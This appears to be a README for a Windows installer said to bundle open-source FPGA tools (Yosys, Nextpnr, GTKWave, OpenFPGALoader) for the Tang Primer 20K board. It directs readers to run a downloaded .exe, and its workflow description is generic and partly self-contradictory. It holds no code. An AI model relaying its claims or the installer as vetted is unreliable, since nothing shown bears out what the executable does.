# ⚡ Tang-Primer-20K-FPGA-Studio - Build custom hardware designs with ease

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Torrietangy164/Tang-Primer-20K-FPGA-Studio)

## 🖥️ Project Overview

Tang-Primer-20K-FPGA-Studio serves as a complete workspace for beginners who want to learn hardware design. You use this software to write digital circuits using Verilog or SystemVerilog code. The studio includes all the tools you need to simulate your design, find errors, and move your finished project onto your Tang Primer 20K board. 

This application combines high-level tools into a single workflow. It handles the difficult tasks of compiling code and talking to your hardware. You focus on your design rather than managing complex toolchains.

## 📋 System Requirements

Ensure your computer meets these requirements before you start:

* Operating System: Windows 10 or Windows 11.
* Memory: 8 GB of RAM or more.
* Storage: 2 GB of free disk space.
* Hardware: A Tang Primer 20K development board and a USB cable.

## 📥 Downloading the Software

You must visit the project release page to get the installer. The software undergoes constant updates to support new features and hardware components.

1. Go to the [official release page](https://github.com/Torrietangy164/Tang-Primer-20K-FPGA-Studio).
2. Look for the latest version listed at the top of the feed.
3. Click the file ending in .exe to start your download.
4. Save the installer to your Downloads folder.

## ⚙️ Installation Process

Follow these steps to set up your environment:

1. Locate the downloaded file in your browser or file manager.
2. Double-click the file to start the installation wizard.
3. Select an installation location on your hard drive. The default settings usually work for most users.
4. Accept the prompts to add the program to your start menu.
5. Wait for the progress bar to finish.
6. Click Finish to close the installer.

## 🚀 Running Your First Project

The studio uses a simple one-command workflow. Follow these steps to verify your setup:

1. Find the Tang-Primer-20K-FPGA-Studio icon on your desktop or start menu.
2. Launch the application.
3. Choose New Project from the welcome screen.
4. Name your project and select a folder to house your design files.
5. Open the editor window and write your first lines of hardware code. 
6. Click the Build button in the top menu bar. The software runs the necessary background tasks to create your hardware map.
7. Connect your Tang Primer 20K board to your computer using the USB cable.
8. Click the Flash button to send the finished project to your board.

## 🛠️ Integrated Tools

* Yosys: Converts your written code into a logic layout.
* Nextpnr: Fits your logic layout onto the specific FPGA chip on your board.
* Icarus Verilog: Allows you to verify your code without needing hardware.
* GTKWave: Displays a visual graph of signals to help you debug errors.
* OpenFPGALoader: Handles the communication between your PC and the Tang Primer board.

## 💡 Using the Debugger

Errors occur during design. Use the simulator to find them before you send code to the board. Your code might work in theory but fail in reality. The debugger helps you see exactly where the failure happens inside your logic.

1. Open your project file in the editor.
2. Select Run Simulation from the toolbar.
3. Open the wave viewer to see signal changes over time.
4. Compare your manual expectations against the graph.
5. If the graph shows a mismatch, adjust your Verilog code and run the simulation again.

## 📚 Frequently Asked Questions

**Does the software require internet access during use?**
No. Once you install the software, it works offline. You only need the internet to download updates or resources.

**What if the computer does not see my board?**
Ensure the USB cable connects the board firmly to the computer. Check your Device Manager in Windows to verify the computer recognizes the USB connection. If you see an unknown device, try a different USB port.

**Can I use other IDEs with this?**
This studio provides a custom interface to bundle all necessary tools. While experienced users might try to link these tools manually, this studio makes that process automatic for you.

**How do I update the software?**
When a new version appears on the release page, download the new installer. You may run the new installer over the old version to update your files.

## 🤝 Contributing

This project relies on contributions from the community. If you find a bug, report it on the repository page. Clear instructions on how to replicate the issue help developers fix it faster. If you want to improve the documentation or add features, submit a pull request through GitHub.

Keywords: eda, education, fpga, fpga-beginners, fpga-development, fpga-ide, gowin, gtkwave, hardware-design, iverilog, nextpnr, open-source, openfpgaloader, sipeed, systemverilog, tang-primer-20k, verilator, verilog, windows, yosys